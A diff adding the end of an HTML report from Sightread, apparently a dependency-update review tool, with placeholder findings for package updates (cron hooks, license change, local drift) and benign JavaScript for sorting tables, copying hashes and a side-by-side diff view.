+<dt>Installed</dt><dd class="where">composer.lock:7</dd>
+<dt>Integrity</dt><dd>both versions: verified by shasum <span class="muted">(packagist.org)</span></dd>
+<dt>sha256</dt><dd><code>4444444444444444444444444444444444444444444444444444444444444444</code> <button type="button" data-copy="4444444444444444444444444444444444444444444444444444444444444444">copy</button></dd>
+<dt>Publisher</dt><dd>not known</dd>
+</dl>
+<div class="pair">
+<div>
+<h3>Changelog</h3>
+<p class="muted">None for this version.</p>
+</div>
+<div>
+<h3>What the diff adds</h3>
+<ul class="adds">
+<li class="zero">network</li><li class="zero">0</li>
+<li class="zero">execution</li><li class="zero">0</li>
+<li>files</li><li>1</li>
+<li class="zero">users</li><li class="zero">0</li>
+<li>cron</li><li>1</li>
+<li>dependencies</li><li>1</li>
+</ul>
+</div>
+</div>
+<h3>Findings (6)</h3>
+
+<article class="finding">
+<h4><span class="sev sev-low">LOW</span> Schedules a new background task <span class="tag">cron-new-hook</span></h4>
+<div class="where">includes/cron-new-hook.php:10</div>
+<pre>cron-new-hook evidence</pre>
+<p>→ Review cron-new-hook before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-low">LOW</span> License changed <span class="tag">license-change</span></h4>
+<div class="where">includes/license-change.php:10</div>
+<pre>license-change evidence</pre>
+<p>→ Review license-change before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-low">LOW</span> Marked abandoned or not updated in years <span class="tag">abandoned</span></h4>
+<div class="where">includes/abandoned.php:10</div>
+<pre>abandoned evidence</pre>
+<p>→ Review abandoned before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-info">INFO</span> Installed copy differs from the official one <span class="tag">local-drift</span></h4>
+<div class="where">includes/local-drift.php:10</div>
+<pre>local-drift evidence</pre>
+<p>→ Review local-drift before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-info">INFO</span> PHP requirement changed <span class="tag">php-requirement</span></h4>
+<div class="where">includes/php-requirement.php:10</div>
+<pre>php-requirement evidence</pre>
+<p>→ Review php-requirement before you update.</p>
+</article>
+
+<article class="finding">
+<h4><span class="sev sev-info">INFO</span> Removes security-relevant files <span class="tag">files-removed</span></h4>
+<div class="where">includes/files-removed.php:10</div>
+<pre>files-removed evidence</pre>
+<p>→ Review files-removed before you update.</p>
+</article>
+</section>
+<section class="card" id="u6">
+<h2><span class="verdict v-routine">ROUTINE</span> wpforms-lite 1.9.1 → 1.9.2</h2>
+<p class="muted">wp-plugin · on 2 sites</p>
+<details><summary>Sites</summary>
+<ul>
+<li>brochure</li>
+<li>shop</li>
+</ul>
+</details>
+<dl class="facts">
+<dt>Integrity</dt><dd>both versions: every file matches wordpress.org checksums (SHA-256) <span class="muted">(wordpress.org)</span></dd>
+<dt>sha256</dt><dd><code>1111111111111111111111111111111111111111111111111111111111111111</code> <button type="button" data-copy="1111111111111111111111111111111111111111111111111111111111111111">copy</button></dd>
+<dt>Archive</dt><dd><code>hxxps://downloads.wordpress[.]org/plugin/sample.1.9.2.zip</code></dd>
+<dt>Publisher</dt><dd>sampleauthor</dd>
+</dl>
+<div class="pair">
+<div>
+<h3>Changelog</h3>
+<p class="muted">None for this version.</p>
+</div>
+<div>
+<h3>What the diff adds</h3>
+<ul class="adds">
+<li class="zero">network</li><li class="zero">0</li>
+<li class="zero">execution</li><li class="zero">0</li>
+<li class="zero">files</li><li class="zero">0</li>
+<li class="zero">users</li><li class="zero">0</li>
+<li class="zero">cron</li><li class="zero">0</li>
+<li class="zero">dependencies</li><li class="zero">0</li>
+</ul>
+</div>
+</div>
+</section>
+<section class="card">
+<h2>Not checked</h2>
+<ul>
+<li>gravityforms 2.8.1 (wp-plugin): not on WordPress.org. Give the vendor&#39;s zip with --to-file</li>
+<li>left-pad (npm): can&#39;t reach registry.npmjs.org (no such host) (E7)</li>
+</ul>
+</section>
+<section class="card">
+<h2>Warnings</h2>
+<ul>
+<li>local-drift: wp-mail-smtp on disk is not the 4.1.1 wordpress.org ships</li>
+</ul>
+</section>
+
+<footer>
+<p>Static diff of official releases; Sightread never ran this code. Not proof an update is safe.</p>
+<p>Sightread reports what changed. It does not judge intent.</p>
+<p>Record a review with <code>rhythm sightread allow &lt;eco:name@version&gt; --reason "..."</code>; it is kept in .sightread/allowed.yaml by the archive's sha256.</p>
+<p>Signal reference: https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference · rhythm-sightread <version></p>
+</footer>
+</main>
+<script>// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
+// SPDX-License-Identifier: MIT
+
+(function () {
+  "use strict";
+  // Sort the update table by a column; the cell's data-v holds the key.
+  document.querySelectorAll("table.sortable th[data-col]").forEach(function (th) {
+    th.addEventListener("click", function () {
+      var table = th.closest("table"), body = table.tBodies[0], col = +th.dataset.col;
+      var asc = th.getAttribute("aria-sort") !== "ascending";
+      table.querySelectorAll("th[data-col]").forEach(function (o) { o.removeAttribute("aria-sort"); });
+      th.setAttribute("aria-sort", asc ? "ascending" : "descending");
+      var rows = Array.prototype.slice.call(body.rows);
+      rows.sort(function (a, b) {
+        var x = a.cells[col].dataset.v || a.cells[col].textContent, y = b.cells[col].dataset.v || b.cells[col].textContent;
+        var c = x.localeCompare(y, undefined, { numeric: true });
+        return asc ? c : -c;
+      });
+      rows.forEach(function (r) { body.appendChild(r); });
+    });
+  });
+
+  // Copy a hash or a command.
+  document.querySelectorAll("button[data-copy]").forEach(function (b) {
+    b.addEventListener("click", function () {
+      if (!navigator.clipboard) { return; }
+      navigator.clipboard.writeText(b.dataset.copy).then(function () {
+        b.textContent = "copied";
+        setTimeout(function () { b.textContent = "copy"; }, 1500);
+      });
+    });
+  });
+
+  // Side by side: built once from the unified rows, text only.
+  function cell(tr, cls, text) {
+    var td = document.createElement("td");
+    td.className = cls;
+    td.textContent = text;
+    tr.appendChild(td);
+  }
+  function split(table) {
+    var out = document.createElement("table"), body = document.createElement("tbody");
+    out.className = "diff split";
+    var dels = [], adds = [];
+    function flush() {
+      for (var i = 0; i < Math.max(dels.length, adds.length); i++) {
+        var tr = document.createElement("tr"), d = dels[i], a = adds[i];
+        cell(tr, "ln", d ? d.cells[0].textContent : "");
+        cell(tr, d ? "code del" : "code", d ? d.cells[2].textContent : "");
+        cell(tr, "ln", a ? a.cells[1].textContent : "");
+        cell(tr, a ? "code add" : "code", a ? a.cells[2].textContent : "");
+        body.appendChild(tr);
+      }
+      dels = []; adds = [];
+    }
+    Array.prototype.forEach.call(table.tBodies[0].rows, function (r) {
+      var k = r.dataset.k;
+      if (k === "-") { if (adds.length) { flush(); } dels.push(r); return; }
+      if (k === "+") { adds.push(r); return; }
+      flush();
+      var tr = document.createElement("tr");
+      cell(tr, "ln", r.cells[0].textContent);
+      cell(tr, "code " + (k === "@" ? "hunk" : ""), r.cells[2].textContent);
+      cell(tr, "ln", r.cells[1].textContent);
+      cell(tr, "code " + (k === "@" ? "hunk" : ""), r.cells[2].textContent);
+      body.appendChild(tr);
+    });
+    flush();
+    out.appendChild(body);
+    table.parentNode.insertBefore(out, table.nextSibling);
+  }
+  var toggle = document.getElementById("view");
+  if (toggle) {
+    toggle.addEventListener("click", function () {
+      var side = !document.body.classList.contains("side");
+      if (side) {
+        document.querySelectorAll("table.diff.unified").forEach(function (t) {
+          if (!t.nextElementSibling || !t.nextElementSibling.classList.contains("split")) { split(t); }
+        });
+      }
+      document.body.classList.toggle("side", side);
+      toggle.textContent = side ? "Show unified" : "Show side by side";
+    });
+  }
+})();
+</script>
+</body>
+</html>
